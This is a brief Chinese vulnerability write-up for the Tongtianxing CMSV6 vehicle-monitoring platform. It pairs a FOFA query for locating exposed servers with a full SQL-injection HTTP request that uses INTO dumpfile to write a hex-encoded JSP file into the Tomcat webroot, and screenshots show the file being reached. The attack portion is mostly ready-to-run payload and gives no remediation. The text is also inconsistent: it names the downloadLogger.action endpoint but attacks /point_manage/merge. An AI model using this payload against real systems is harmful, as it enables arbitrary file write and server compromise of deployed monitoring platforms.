# 通天星CMSV6存在SQL注入漏洞

### 1.漏洞描述

通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。

通天星CMSV6车载定位监控平台 downloadLogger.action?ids接口处存在SQL注入漏洞，恶意攻击者可能会利用该漏洞获取敏感信息，从而导致服务器失陷。

### 2.fofa语法

```plain
body="/808gps/"
```

### 3.漏洞复现

```plain
POST /point_manage/merge HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded


id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a
WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719314113974-3a51d820-60ed-45f7-9a46-60d26e0c11bd.png)

拼接路径    /allgods.jsp

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719314236921-e4710fc9-25fc-4ec8-b854-f7fed2d65e78.png)